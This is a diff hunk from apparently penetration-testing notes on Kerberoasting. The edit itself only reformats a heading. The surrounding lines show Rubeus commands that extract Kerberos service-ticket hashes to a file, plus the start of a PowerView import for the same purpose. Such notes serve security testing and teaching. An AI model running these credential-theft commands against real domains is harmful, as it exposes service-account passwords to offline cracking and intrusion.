@@ -30,7 +30,7 @@ By using use [Rubeus]([https://github.com/GhostPack/Rubeus](https://github.com/M
 .\Rubeus.exe kerberoast /nowrap
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast /nowrap
 ```
-### Using PowerView to Extract TGS Tickets
+### Using `PowerView` to Extract TGS Tickets
 
 ``` powershell
 Import-Module .\PowerView.ps1
